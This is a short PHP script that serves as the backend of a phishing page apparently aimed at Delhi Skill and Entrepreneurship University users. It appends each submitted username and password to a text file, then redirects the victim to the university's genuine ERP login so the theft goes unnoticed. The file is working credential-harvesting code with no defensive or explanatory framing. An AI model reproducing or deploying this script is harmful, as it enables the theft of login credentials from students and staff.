<?php
file_put_contents("usernames.txt", "DSEU Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://erp.dseu.ac.in/');
exit();
?>
